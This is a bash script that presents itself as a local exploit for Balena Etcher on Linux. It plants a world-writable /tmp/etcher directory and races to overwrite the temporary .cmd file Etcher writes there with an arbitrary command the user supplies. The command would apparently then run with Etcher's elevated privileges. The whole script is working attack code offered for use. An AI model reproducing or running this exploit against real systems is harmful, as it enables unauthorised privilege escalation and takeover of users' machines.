#!/bin/bash

#balena-etcher exploit

printf "
╔═╗┌┬┐┌─┐┬ ┬┌─┐┬─┐  ╦  ╔═╗╔═╗
║╣  │ │  ├─┤├┤ ├┬┘  ║  ╠═╝║╣ 
╚═╝ ┴ └─┘┴ ┴└─┘┴└─  ╩═╝╩  ╚═╝
╔═╗─┐ ┬┌─┐┬  ┌─┐┬┌┬┐         
║╣ ┌┴┬┘├─┘│  │ ││ │          
╚═╝┴ └─┴  ┴─┘└─┘┴ ┴          
                                   -by Febin
"
check_etcher(){

if [ -d /opt/balenaEtcher ]
then
echo "[+] Balena Etcher is installed on the system!"
return 0
else
echo "[-] Seems like Balena Etcher is not installed on the system!"
return 1
fi

}

check_tempEtcher(){

if [ -d /tmp/etcher ]
then
   echo "etcher directory found in /tmp!"
   echo "[+] Checking if /tmp/etcher is owned by current user: $(whoami)"
   if [ -O /tmp/etcher ]
   then
    echo "[+] /tmp/etcher is owned by the current user: $(whoami)"
    rm -rf /tmp/etcher
    mkdir /tmp/etcher
    chmod -R 777 /tmp/etcher
    return 0
   else
    echo "[-] /tmp/etcher is not owned by the current user: $(whoami), wait for the system to reboot or try force reboot and run the exploit again."
    return 1
   fi
else
 echo "[+] /tmp/etcher is not present, exploit is good to go!"
 echo "[+] Creating /tmp/etcher...."
 mkdir /tmp/etcher
 chmod -R 777 /tmp/etcher 
 return 0
fi

}


if [ $1 ]
then 
payload_cmd=$1
else
printf "Enter the command to be included in the payload: "
read payload_cmd
fi


writer(){

printf '#!/bin/bash' > /tmp/write.sh
printf "\n\n" >> /tmp/write.sh
printf "%s"  " 
write_payload(){
    echo ....
    etcher_cmd=\$(find /tmp/etcher/ -name balena-etcher-*.cmd)
    rm -rf /tmp/etcher
    mkdir /tmp/etcher
    chmod -R 777 /tmp/etcher
    echo '$payload_cmd' > \$etcher_cmd
    chmod 777 /tmp/etcher/*
    echo \"[+] Someone has started Etcher.\"
    echo \"[+] Exploit ran successfully! Payload written to  \$etcher_cmd\"
    touch /tmp/etcher/exit_loop
exit
}

write_payload
" >> /tmp/write.sh

}




run_exploit(){
while true
do
    find /tmp/etcher/ -not -empty -exec bash /tmp/write.sh  {} \; 2>/dev/null
    if [ -e /tmp/etcher/exit_loop ]
    then
    rm -rf /tmp/etcher/exit_loop
    exit
    fi

done

}
check_etcher
if [ "$?" == "0" ]
then

  check_tempEtcher
  if [ "$?" == "0" ]
  then
  writer
  run_exploit
  else
  exit
  fi
else
exit
fi
